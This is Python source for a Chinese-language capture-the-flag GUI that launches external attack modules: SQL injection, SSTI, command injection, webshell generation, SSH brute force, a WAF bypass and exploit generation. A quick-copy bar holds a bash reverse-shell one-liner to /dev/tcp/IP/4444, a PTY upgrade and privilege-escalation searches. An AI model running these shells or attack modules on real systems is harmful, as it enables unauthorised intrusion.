#!/usr/bin/python3
"""
CTF Toolkit v7.0 — GUI (中文版)
启动: ctf-gui
优化: 添加智能自动化引擎、WAF绕过、游戏题自动化
"""
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import subprocess, threading, os, time, sys, json, re
from pathlib import Path

TK = "/root/ctf-toolkit"
ENGINE = f"{TK}/engine.py"
LOOT = f"{TK}/loot"

# 暗色主题配色
C = {
    "bg":"#0d1117","bg2":"#161b22","bg3":"#21262d",
    "fg":"#c9d1d9","dim":"#8b949e","blue":"#58a6ff",
    "green":"#3fb950","red":"#f85149","orange":"#d29922",
    "white":"#ffffff","yellow":"#e3b341","cyan":"#39d2c0",
    "purple":"#bc8cff","pink":"#f778ba",
}

def extract_flags(text):
    return list(set(re.findall(r"(?:flag|FLAG|ctf|CTF|key|KEY|secret|token)\{[^}]{3,80}\}", str(text))))

def parse_findings_json(loot_dir):
    p = os.path.join(loot_dir, "findings.json")
    if os.path.exists(p):
        try:
            with open(p) as f: return json.load(f)
        except: pass
    return []


class Exec:
    def __init__(self, app):
        self.app = app
        self.proc = None
        self.running = False

    def run(self, cmd, label="", callback=None):
        if self.running:
            self.app.log("[!] 已有任务运行中\n", "warn")
            return
        def _w():
            self.running = True
            self.app.root.after(0, lambda: self.app.status(f">> {label}", C["orange"]))
            self.app.root.after(0, lambda: self.app.log(f"\n{'─'*50}\n$ {' '.join(cmd) if isinstance(cmd,list) else cmd}\n{'─'*50}\n", "cmd"))
            try:
                self.proc = subprocess.Popen(
                    cmd, shell=isinstance(cmd, str), stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT, text=True, bufsize=1, cwd=TK
                )
                for line in iter(self.proc.stdout.readline, ""):
                    tag = self._tag(line)
                    self.app.root.after(0, lambda l=line, t=tag: self.app.log(l, t))
                    for flag in extract_flags(line):
                        self.app.root.after(0, lambda f=flag: self.app.auto_flag(f))
                rc = self.proc.wait()
                t = "ok" if rc == 0 else "err"
                self.app.root.after(0, lambda: self.app.log(f"\n[退出码={rc}]\n", t))
                if callback: self.app.root.after(100, callback)
            except Exception as e:
                self.app.root.after(0, lambda: self.app.log(f"[错误] {e}\n", "err"))
            finally:
                self.proc = None
                self.running = False
                self.app.root.after(0, lambda: self.app.status("就绪", C["dim"]))
        threading.Thread(target=_w, daemon=True).start()

    def kill(self):
        if self.proc:
            try: self.proc.terminate()
            except: pass
            self.running = False

    @staticmethod
    def _tag(line):
        s = line.lower()
        if any(k in s for k in ["flag{","uid=","root:","hit","critical","vuln","[!]"]): return "hit"
        if any(k in s for k in ["[+]","ok","200","found","exit=0"]): return "ok"
        if any(k in s for k in ["[-]","error","fail","exit="]): return "err"
        if any(k in s for k in ["[?]","warn"]): return "warn"
        return None


class App:
    def __init__(self, root):
        self.root = root
        self.root.title("CTF 攻防工具包 v7.0 - 智能自动化引擎")
        self.root.geometry("1440x960")
        self.root.minsize(1200, 800)
        self.root.configure(bg=C["bg"])
        self.flags = []
        self.findings = []
        self.exec = Exec(self)
        self._setup_styles()
        self._build()
        self._load_existing_loot()

    def _setup_styles(self):
        s = ttk.Style()
        s.theme_use("default")
        s.configure(".", background=C["bg"], foreground=C["fg"], font=("Consolas",10))
        s.configure("TFrame", background=C["bg"])
        s.configure("TLabel", background=C["bg"], foreground=C["fg"])
        s.configure("TButton", background=C["bg3"], foreground=C["fg"], padding=4, font=("Consolas",9))
        s.map("TButton", background=[("active",C["blue"])], foreground=[("active",C["white"])])
        s.configure("TNotebook", background=C["bg"], borderwidth=0)
        s.configure("TNotebook.Tab", background=C["bg3"], foreground=C["fg"], padding=[10,4], font=("Consolas",9,"bold"))
        s.map("TNotebook.Tab", background=[("selected",C["blue"])], foreground=[("selected",C["white"])])
        s.configure("TLabelframe", background=C["bg"], foreground=C["blue"], font=("Consolas",9,"bold"))
        s.configure("TLabelframe.Label", background=C["bg"], foreground=C["blue"])
        s.configure("TCombobox", fieldbackground=C["bg3"], foreground=C["fg"])

    def _build(self):
        # 顶部: 目标栏
        top = tk.Frame(self.root, bg=C["bg2"], height=56)
        top.pack(fill="x", padx=4, pady=(4,0))
        top.pack_propagate(False)

        # Logo区域
        logo_frame = tk.Frame(top, bg=C["bg2"])
        logo_frame.pack(side="left", padx=(10,4))
        tk.Label(logo_frame, text="🎯 CTF", bg=C["bg2"], fg=C["blue"], 
                font=("Consolas",14,"bold")).pack(side="left")
        tk.Label(logo_frame, text=" v7.0", bg=C["bg2"], fg=C["dim"], 
                font=("Consolas",10)).pack(side="left", pady=(4,0))

        # 目标输入
        tk.Label(top, text="目标:", bg=C["bg2"], fg=C["dim"], font=("Consolas",10,"bold")).pack(side="left", padx=(10,4))
        self.e_target = tk.Entry(top, font=("Consolas",11), bg=C["bg"], fg=C["white"],
                                 insertbackground=C["white"], width=50, relief="flat", bd=3)
        self.e_target.pack(side="left", padx=4, fill="x", expand=True)
        self.e_target.insert(0, "http://")
        self.e_target.bind("<Return>", lambda e: self._auto_solve())

        # 模式选择
        tk.Label(top, text="模式:", bg=C["bg2"], fg=C["dim"], font=("Consolas",9)).pack(side="left", padx=(10,2))
        self.cb_mode = ttk.Combobox(top, values=["智能自动","完整","快速","隐蔽"], width=8, state="readonly")
        self.cb_mode.set("智能自动")
        self.cb_mode.pack(side="left", padx=2)

        # 按钮区域
        btn_frame = tk.Frame(top, bg=C["bg2"])
        btn_frame.pack(side="right", padx=4)
        
        tk.Button(btn_frame, text="停止", command=self.exec.kill,
                  font=("Consolas",10), bg=C["red"], fg=C["white"],
                  relief="flat", padx=10, pady=2, cursor="hand2").pack(side="right", padx=4)
        tk.Button(btn_frame, text="🚀 智能解题", command=self._auto_solve,
                  font=("Consolas",11,"bold"), bg=C["green"], fg=C["white"],
                  activebackground="#2ea043", relief="flat", padx=15, pady=2, cursor="hand2").pack(side="right", padx=4)
        tk.Button(btn_frame, text="开始攻击", command=self._auto_attack,
                  font=("Consolas",11,"bold"), bg=C["red"], fg=C["white"],
                  activebackground="#da3633", relief="flat", padx=15, pady=2, cursor="hand2").pack(side="right", padx=4)

        # 中间: 左面板 + 右输出
        pw = ttk.PanedWindow(self.root, orient="horizontal")
        pw.pack(fill="both", expand=True, padx=4, pady=4)
        left = tk.Frame(pw, bg=C["bg"], width=280)
        pw.add(left, weight=0)
        right = tk.Frame(pw, bg=C["bg"])
        pw.add(right, weight=1)
        self._build_left(left)
        self._build_right(right)

    def _build_left(self, parent):
        nb = ttk.Notebook(parent)
        nb.pack(fill="both", expand=True)
        for name, builder in [
            ("智能", self._tab_smart), ("攻击", self._tab_attack), 
            ("Web", self._tab_web), ("密码", self._tab_crypto), 
            ("PWN", self._tab_pwn), ("杂项", self._tab_misc), 
            ("防御", self._tab_defense),
        ]:
            f = ttk.Frame(nb)
            nb.add(f, text=f" {name} ")
            builder(f)

    def _tab_smart(self, f):
        """智能自动化标签页"""
        g = ttk.LabelFrame(f, text="🎯 一键智能解题")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "🚀 智能解题 (自动识别)", self._auto_solve, C["green"])
        self._btn(g, "📊 批量解题", lambda: self._browse_and_run("batch-solve"), C["blue"])
        
        g = ttk.LabelFrame(f, text="🛡️ WAF绕过 (Coraza)")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "检测WAF", lambda: self._run("coraza-bypass", [self._t(), self._p()]), C["cyan"])
        self._btn(g, "UNION VALUES绕过", lambda: self._run_waf_bypass(), C["cyan"])
        
        g = ttk.LabelFrame(f, text="🎮 游戏题自动化")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "自动玩游戏", lambda: self._run("game-auto", [self._t()]), C["purple"])
        self._btn(g, "生成Kernel", lambda: self._show_kernel_dialog(), C["purple"])
        
        g = ttk.LabelFrame(f, text="📄 PDF泄露检测")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "检测PDF泄露", lambda: self._run("pdf-leak", [self._t()]), C["pink"])
        
        g = ttk.LabelFrame(f, text="💡 智能建议")
        g.pack(fill="x", padx=3, pady=3)
        self.lbl_suggest = tk.Label(g, text="输入目标后点击智能解题", bg=C["bg"], fg=C["dim"], 
                                   font=("Consolas",9), wraplength=250, justify="left")
        self.lbl_suggest.pack(fill="x", padx=4, pady=4)

    def _tab_attack(self, f):
        g = ttk.LabelFrame(f, text="自动攻击链")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "全自动攻击", self._auto_attack, C["red"])
        self._btn(g, "Web侦察", lambda: self._run("web-recon", [self._t()]))
        self._btn(g, "Web利用", lambda: self._run("exploit", [self._t()]))

        g = ttk.LabelFrame(f, text="快速操作")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "搜索Flag", lambda: self._run("flag-hunt", ["/"]))
        self._btn(g, "批量利用", lambda: self._browse_and_run("batch"))
        self._btn(g, "端口扫描", lambda: self._run("scan", [self._t()]))
        self._btn(g, "目录扫描", lambda: self._run("fuzz", [self._t()]))
        self._btn(g, "服务枚举", lambda: self._run("enum", [self._t()]))
        self._btn(g, "暴力破解", lambda: self._run("brute", [self._t(), "ssh"]))

        g = ttk.LabelFrame(f, text="引擎选项")
        g.pack(fill="x", padx=3, pady=3)
        self.var_web_only = tk.BooleanVar()
        self.var_no_brute = tk.BooleanVar()
        self.var_no_local = tk.BooleanVar()
        for text, var in [("仅Web", self.var_web_only), ("跳过爆破", self.var_no_brute),
                          ("跳过本地Flag", self.var_no_local)]:
            tk.Checkbutton(g, text=text, variable=var, bg=C["bg"], fg=C["fg"],
                           selectcolor=C["bg3"], activebackground=C["bg"],
                           font=("Consolas",9)).pack(anchor="w", padx=4)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=4, pady=2)
        ttk.Label(fr, text="超时:").pack(side="left")
        self.e_timeout = ttk.Entry(fr, width=4, font=("Consolas",9))
        self.e_timeout.insert(0, "8")
        self.e_timeout.pack(side="left", padx=2)
        ttk.Label(fr, text="秒").pack(side="left")

    def _tab_web(self, f):
        g = ttk.LabelFrame(f, text="注入检测")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "SQL注入", lambda: self._run("sqli", [self._t(), self._p()]))
        self._btn(g, "SSTI模板注入", lambda: self._run("ssti", [self._t(), self._p()]))
        self._btn(g, "命令注入", lambda: self._run("cmdi", [self._t(), self._p()]))
        self._btn(g, "文件包含", lambda: self._run("lfi", [self._t(), self._p()]))

        g = ttk.LabelFrame(f, text="其他漏洞")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "XSS跨站脚本", lambda: self._run("xss", [self._t(), self._p()]))
        self._btn(g, "文件上传", lambda: self._run("upload", [self._t()]))
        self._btn(g, "JWT令牌攻击", lambda: self._run("jwt", [self._t()]))

        g = ttk.LabelFrame(f, text="Shell生成")
        g.pack(fill="x", padx=3, pady=3)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=3, pady=2)
        for t in ["PHP","JSP","Python","All"]:
            ttk.Button(fr, text=t, width=5,
                       command=lambda s=t.lower(): self._run("shell",[s])
                       ).pack(side="left", padx=1, fill="x", expand=True)

        g = ttk.LabelFrame(f, text="参数设置")
        g.pack(fill="x", padx=3, pady=3)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=3, pady=2)
        ttk.Label(fr, text="参数名:").pack(side="left")
        self.e_param = ttk.Entry(fr, font=("Consolas",9), width=10)
        self.e_param.insert(0, "id")
        self.e_param.pack(side="left", padx=2, fill="x", expand=True)

    def _tab_crypto(self, f):
        g = ttk.LabelFrame(f, text="编码解码")
        g.pack(fill="x", padx=3, pady=3)
        self.e_crypto = ttk.Entry(g, font=("Consolas",9))
        self.e_crypto.pack(fill="x", padx=3, pady=2)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=3, pady=2)
        for m in ["自动","Base64","Hex","ROT13","摩斯"]:
            ttk.Button(fr, text=m, width=5,
                       command=lambda s=m: self._run("crypto",[s, self.e_crypto.get()])
                       ).pack(side="left", padx=1, fill="x", expand=True)

        g = ttk.LabelFrame(f, text="RSA攻击")
        g.pack(fill="x", padx=3, pady=3)
        for label, attr in [("n","rsa_n"),("e","rsa_e"),("c","rsa_c")]:
            fr = ttk.Frame(g)
            fr.pack(fill="x", padx=3, pady=1)
            ttk.Label(fr, text=f"{label}:", width=2).pack(side="left")
            e = ttk.Entry(fr, font=("Consolas",9))
            e.pack(side="left", fill="x", expand=True)
            setattr(self, attr, e)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=3, pady=2)
        for m in ["小指数","费马","Pollard"]:
            ttk.Button(fr, text=m, width=6,
                       command=lambda s=m: self._run("rsa",[s, self.rsa_n.get(), self.rsa_e.get(), self.rsa_c.get()])
                       ).pack(side="left", padx=1, fill="x", expand=True)

        g = ttk.LabelFrame(f, text="哈希破解")
        g.pack(fill="x", padx=3, pady=3)
        self.e_hash = ttk.Entry(g, font=("Consolas",9))
        self.e_hash.pack(fill="x", padx=3, pady=2)
        ttk.Button(g, text="破解", command=lambda: self._run("hash",[self.e_hash.get()])
                   ).pack(fill="x", padx=3, pady=2)

    def _tab_pwn(self, f):
        g = ttk.LabelFrame(f, text="二进制文件")
        g.pack(fill="x", padx=3, pady=3)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=3, pady=2)
        self.e_bin = ttk.Entry(fr, font=("Consolas",9))
        self.e_bin.pack(side="left", fill="x", expand=True)
        ttk.Button(fr, text="..", width=3, command=lambda: self._browse(self.e_bin)).pack(side="left", padx=2)

        g = ttk.LabelFrame(f, text="PWN利用")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "保护检查", lambda: self._run("pwn-check", [self.e_bin.get()]))
        self._btn(g, "生成Exploit", lambda: self._run("pwn-exploit", [self.e_bin.get()]))
        self._btn(g, "ROP搜索", lambda: self._run("pwn-rop", [self.e_bin.get()]))
        self._btn(g, "模式字符串", lambda: self._run("pwn-pattern", ["200"]))

        g = ttk.LabelFrame(f, text="逆向分析")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "静态分析", lambda: self._run("rev", [self.e_bin.get()]))
        self._btn(g, "动态分析", lambda: self._run("rev-dynamic", [self.e_bin.get()]))
        self._btn(g, "PYC反编译", lambda: self._run("rev-pyc", [self.e_bin.get()]))

    def _tab_misc(self, f):
        g = ttk.LabelFrame(f, text="文件分析")
        g.pack(fill="x", padx=3, pady=3)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=3, pady=2)
        self.e_misc = ttk.Entry(fr, font=("Consolas",9))
        self.e_misc.pack(side="left", fill="x", expand=True)
        ttk.Button(fr, text="..", width=3, command=lambda: self._browse(self.e_misc)).pack(side="left", padx=2)
        self._btn(g, "文件类型", lambda: self._run("file", [self.e_misc.get()]))
        self._btn(g, "隐写分析", lambda: self._run("stego", [self.e_misc.get()]))
        self._btn(g, "取证分析", lambda: self._run("forensics", [self.e_misc.get()]))
        self._btn(g, "流量包分析", lambda: self._run("pcap", [self.e_misc.get()]))
        self._btn(g, "压缩包破解", lambda: self._run("zip", [self.e_misc.get()]))

    def _tab_defense(self, f):
        g = ttk.LabelFrame(f, text="AWD攻防")
        g.pack(fill="x", padx=3, pady=3)
        self._btn(g, "流量监控", lambda: self._run("monitor", []))
        self._btn(g, "攻击检测", lambda: self._run("detect", []))
        self._btn(g, "Flag保护", lambda: self._run("flag-protect", []))
        g = ttk.LabelFrame(f, text="漏洞修补")
        g.pack(fill="x", padx=3, pady=3)
        fr = ttk.Frame(g)
        fr.pack(fill="x", padx=3, pady=2)
        self.cb_patch = ttk.Combobox(fr, values=["all","ssh","mysql","redis","apache","nginx","php"], width=8)
        self.cb_patch.set("all")
        self.cb_patch.pack(side="left", padx=2)
        ttk.Button(fr, text="修补", command=lambda: self._run("patch",[self.cb_patch.get()])
                   ).pack(side="left", padx=2, fill="x", expand=True)

    # ── 右侧面板 ──────────────────────────────────────────
    def _build_right(self, parent):
        out_nb = ttk.Notebook(parent)
        out_nb.pack(fill="both", expand=True)

        # 输出标签
        out_frame = ttk.Frame(out_nb)
        out_nb.add(out_frame, text=" 输出 ")

        bar = tk.Frame(out_frame, bg=C["bg2"])
        bar.pack(fill="x")
        for text, cmd in [("清空", self._clear), ("复制", self._copy), ("停止", self.exec.kill),
                          ("导出", self._export_output), ("搜索", self._toggle_search)]:
            tk.Button(bar, text=text, command=cmd, font=("Consolas",8),
                      bg=C["bg3"], fg=C["dim"], relief="flat", padx=6, pady=1
                      ).pack(side="left", padx=1, pady=1)
        self.lbl_status = tk.Label(bar, text="就绪", bg=C["bg2"], fg=C["dim"], font=("Consolas",8))
        self.lbl_status.pack(side="right", padx=8)

        self.search_frame = tk.Frame(out_frame, bg=C["bg3"])
        self.search_visible = False
        tk.Label(self.search_frame, text="查找:", bg=C["bg3"], fg=C["fg"], font=("Consolas",9)).pack(side="left", padx=4)
        self.e_search = tk.Entry(self.search_frame, font=("Consolas",9), bg=C["bg"], fg=C["white"],
                                 insertbackground=C["white"], width=30, relief="flat", bd=2)
        self.e_search.pack(side="left", padx=4, fill="x", expand=True)
        self.e_search.bind("<Return>", lambda e: self._do_search())
        tk.Button(self.search_frame, text="下一个", command=self._do_search,
                  font=("Consolas",8), bg=C["bg3"], fg=C["dim"], relief="flat", padx=4).pack(side="left", padx=2)
        tk.Button(self.search_frame, text="X", command=self._toggle_search,
                  font=("Consolas",9), bg=C["bg3"], fg=C["red"], relief="flat", padx=4).pack(side="left", padx=2)

        self.txt = tk.Text(out_frame, font=("Consolas",10), bg=C["bg"], fg=C["fg"],
                           insertbackground=C["fg"], relief="flat", wrap="word")
        self.txt.pack(fill="both", expand=True, padx=2, pady=2)
        sb = ttk.Scrollbar(self.txt, command=self.txt.yview)
        sb.pack(side="right", fill="y")
        self.txt.configure(yscrollcommand=sb.set)
        for tag, fg in [("cmd",C["blue"]),("ok",C["green"]),("err",C["red"]),
                        ("warn",C["orange"]),("hit",C["white"])]:
            self.txt.tag_configure(tag, foreground=fg)
        self.txt.tag_configure("hit", foreground=C["white"], background="#1a1a2e")
        self.txt.tag_configure("search", background="#58a6ff", foreground="#000000")

        # 漏洞标签
        vuln_frame = ttk.Frame(out_nb)
        out_nb.add(vuln_frame, text=" 漏洞 ")
        self._build_vuln_panel(vuln_frame)

        # Flag标签
        flag_frame = ttk.Frame(out_nb)
        out_nb.add(flag_frame, text=" Flag ")
        self._build_flag_panel(flag_frame)

        # 战利品标签
        loot_frame = ttk.Frame(out_nb)
        out_nb.add(loot_frame, text=" 战利品 ")
        self._build_loot_panel(loot_frame)

        # 底部: Flag输入 + 快捷栏
        bottom = tk.Frame(parent, bg=C["bg2"], height=34)
        bottom.pack(fill="x", pady=(2,0))
        bottom.pack_propagate(False)

        tk.Label(bottom, text="提交Flag:", bg=C["bg2"], fg=C["orange"], font=("Consolas",10,"bold")).pack(side="left", padx=4)
        self.e_flag = tk.Entry(bottom, font=("Consolas",10), bg=C["bg"], fg=C["green"],
                               insertbackground=C["green"], relief="flat", bd=2)
        self.e_flag.pack(side="left", fill="x", expand=True, padx=4, pady=3)
        self.e_flag.bind("<Return>", lambda e: self._save_flag())
        tk.Button(bottom, text="保存", command=self._save_flag, font=("Consolas",8),
                  bg="#238636", fg="white", relief="flat", padx=6).pack(side="left", padx=2)

        quick = tk.Frame(parent, bg=C["bg"])
        quick.pack(fill="x", pady=(2,2))
        for label, cmd in [
            ("反弹Shell","bash -i >& /dev/tcp/IP/4444 0>&1"),
            ("PTY升级","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
            ("SUID提权","find / -perm -4000 -type f 2>/dev/null"),
            ("sudo -l","sudo -l"),
            ("搜索Flag","grep -r 'flag{' /tmp /var /home 2>/dev/null"),
            ("nc监听","nc -lvnp 4444"),
            ("查看进程","ps aux | grep -v grep"),
            ("网络连接","netstat -tlnp 2>/dev/null || ss -tlnp"),
        ]:
            tk.Button(quick, text=label, command=lambda c=cmd: self._copy_text(c),
                      font=("Consolas",7), bg=C["bg3"], fg=C["dim"], relief="flat", padx=3
                      ).pack(side="left", padx=1, pady=1)

    def _build_vuln_panel(self, parent):
        fr = tk.Frame(parent, bg=C["bg"])
        fr.pack(fill="both", expand=True, padx=2, pady=2)
        self.lst_vuln = tk.Listbox(fr, font=("Consolas",9), bg=C["bg"], fg=C["fg"],
                                   selectbackground=C["blue"], relief="flat")
        self.lst_vuln.pack(fill="both", expand=True)
        self.lst_vuln.bind("<<ListboxSelect>>", self._on_vuln_select)

    def _build_flag_panel(self, parent):
        fr = tk.Frame(parent, bg=C["bg"])
        fr.pack(fill="both", expand=True, padx=2, pady=2)
        self.lst_flag = tk.Listbox(fr, font=("Consolas",9), bg=C["bg"], fg=C["green"],
                                   selectbackground=C["blue"], relief="flat")
        self.lst_flag.pack(fill="both", expand=True)
        self.lst_flag.bind("<Double-Button-1>", self._copy_flag)

    def _build_loot_panel(self, parent):
        fr = tk.Frame(parent, bg=C["bg"])
        fr.pack(fill="both", expand=True, padx=2, pady=2)
        self.lst_loot = tk.Listbox(fr, font=("Consolas",9), bg=C["bg"], fg=C["fg"],
                                   selectbackground=C["blue"], relief="flat")
        self.lst_loot.pack(fill="both", expand=True)
        self.lst_loot.bind("<Double-Button-1>", self._open_loot)

    # ── 辅助方法 ──────────────────────────────────────────
    def _t(self):
        return self.e_target.get().strip()

    def _p(self):
        return self.e_param.get().strip()

    def _btn(self, parent, text, cmd, color=None):
        btn = ttk.Button(parent, text=text, command=cmd)
        btn.pack(fill="x", padx=3, pady=1)
        if color:
            btn.configure(style=f"Color{color}.TButton")

    def _run(self, module, args):
        cmd = ["bash", f"{TK}/ctf.sh", module] + [str(a) for a in args if a]
        self.exec.run(cmd, label=module)

    def _run_waf_bypass(self):
        """运行WAF绕过"""
        target = self._t()
        param = self._p()
        self._run("coraza-bypass", [target, param])

    def _auto_solve(self):
        """智能解题"""
        target = self._t()
        if not target or target == "http://":
            messagebox.showwarning("警告", "请输入目标URL/IP/文件路径")
            return
        
        self.lbl_suggest.config(text=f"正在分析: {target}...", fg=C["orange"])
        self._run("auto-solve", [target])
        
        # 更新建议
        self.root.after(2000, lambda: self.lbl_suggest.config(
            text="分析完成，查看输出标签页获取结果", fg=C["green"]))

    def _auto_attack(self):
        self._run("auto", [self._t()])

    def _show_kernel_dialog(self):
        """显示Kernel生成对话框"""
        dialog = tk.Toplevel(self.root)
        dialog.title("生成游戏Kernel")
        dialog.geometry("400x300")
        dialog.configure(bg=C["bg"])
        dialog.transient(self.root)
        dialog.grab_set()
        
        tk.Label(dialog, text="选择方向:", bg=C["bg"], fg=C["fg"], 
                font=("Consolas",12,"bold")).pack(pady=10)
        
        btn_frame = tk.Frame(dialog, bg=C["bg"])
        btn_frame.pack(pady=10)
        
        directions = [
            ("← 左", "左"), ("→ 右", "右"), 
            ("↑ 上", "上"), ("↓ 下", "下")
        ]
        
        for text, direction in directions:
            tk.Button(btn_frame, text=text, font=("Consolas",14),
                     bg=C["bg3"], fg=C["fg"], relief="flat", padx=20, pady=10,
                     command=lambda d=direction: self._generate_kernel(d, dialog)
                     ).pack(side="left", padx=5)
        
        # 显示生成的kernel
        self.kernel_text = tk.Text(dialog, font=("Consolas",10), bg=C["bg"], fg=C["green"],
                                   height=6, relief="flat")
        self.kernel_text.pack(fill="x", padx=10, pady=10)
        
        tk.Button(dialog, text="复制到剪贴板", font=("Consolas",10),
                 bg=C["blue"], fg=C["white"], relief="flat",
                 command=lambda: self._copy_kernel()).pack(pady=5)

    def _generate_kernel(self, direction, dialog):
        """生成kernel代码"""
        direction_map = {"左": 1, "右": 2, "上": 3, "下": 4}
        code = direction_map.get(direction, 0)
        kernel = f"def player_kernel(m, a, o):\n    o[0] = {code}"
        
        self.kernel_text.delete("1.0", tk.END)
        self.kernel_text.insert("1.0", kernel)
        
        # 也运行命令行版本
        self._run("game-kernel", [direction])

    def _copy_kernel(self):
        """复制kernel到剪贴板"""
        kernel = self.kernel_text.get("1.0", tk.END).strip()
        self.root.clipboard_clear()
        self.root.clipboard_append(kernel)
        self.lbl_status.config(text="Kernel已复制到剪贴板", fg=C["green"])

    def _browse_and_run(self, module):
        path = filedialog.askopenfilename()
        if path:
            self._run(module, [path])

    def _browse(self, entry):
        path = filedialog.askopenfilename()
        if path:
            entry.delete(0, tk.END)
            entry.insert(0, path)

    def log(self, text, tag=None):
        self.txt.insert(tk.END, text, tag)
        self.txt.see(tk.END)

    def status(self, text, color=None):
        self.lbl_status.config(text=text, fg=color or C["dim"])

    def auto_flag(self, flag):
        if flag not in self.flags:
            self.flags.append(flag)
            self.lst_flag.insert(tk.END, flag)
            self.log(f"\n[!] 自动发现Flag: {flag}\n", "hit")
            self.e_flag.delete(0, tk.END)
            self.e_flag.insert(0, flag)

    def _save_flag(self):
        flag = self.e_flag.get().strip()
        if flag and flag not in self.flags:
            self.flags.append(flag)
            self.lst_flag.insert(tk.END, flag)
            self.log(f"[+] Flag已保存: {flag}\n", "ok")
            self.e_flag.delete(0, tk.END)

    def _copy_flag(self, event):
        sel = self.lst_flag.curselection()
        if sel:
            flag = self.lst_flag.get(sel[0])
            self.root.clipboard_clear()
            self.root.clipboard_append(flag)
            self.status(f"已复制: {flag}", C["green"])

    def _on_vuln_select(self, event):
        sel = self.lst_vuln.curselection()
        if sel:
            vuln = self.lst_vuln.get(sel[0])
            self.log(f"\n[漏洞详情] {vuln}\n", "hit")

    def _open_loot(self, event):
        sel = self.lst_loot.curselection()
        if sel:
            path = self.lst_loot.get(sel[0])
            if os.path.exists(path):
                os.system(f"xdg-open {path} 2>/dev/null || open {path} 2>/dev/null")

    def _clear(self):
        self.txt.delete("1.0", tk.END)

    def _copy(self):
        text = self.txt.get("1.0", tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self.status("已复制到剪贴板", C["green"])

    def _copy_text(self, text):
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self.status(f"已复制: {text[:30]}...", C["green"])

    def _export_output(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt",
                                            filetypes=[("Text files", "*.txt")])
        if path:
            with open(path, "w") as f:
                f.write(self.txt.get("1.0", tk.END))
            self.status(f"已导出: {path}", C["green"])

    def _toggle_search(self):
        if self.search_visible:
            self.search_frame.pack_forget()
            self.search_visible = False
        else:
            self.search_frame.pack(fill="x", before=self.txt)
            self.search_visible = True
            self.e_search.focus_set()

    def _do_search(self):
        query = self.e_search.get()
        if not query:
            return
        self.txt.tag_remove("search", "1.0", tk.END)
        start = "1.0"
        while True:
            pos = self.txt.search(query, start, tk.END)
            if not pos:
                break
            end = f"{pos}+{len(query)}c"
            self.txt.tag_add("search", pos, end)
            start = end

    def _load_existing_loot(self):
        if os.path.exists(LOOT):
            for root, dirs, files in os.walk(LOOT):
                for f in files:
                    if f.endswith((".txt", ".json", ".log")):
                        self.lst_loot.insert(tk.END, os.path.join(root, f))


def main():
    root = tk.Tk()
    app = App(root)
    root.mainloop()

if __name__ == "__main__":
    main()
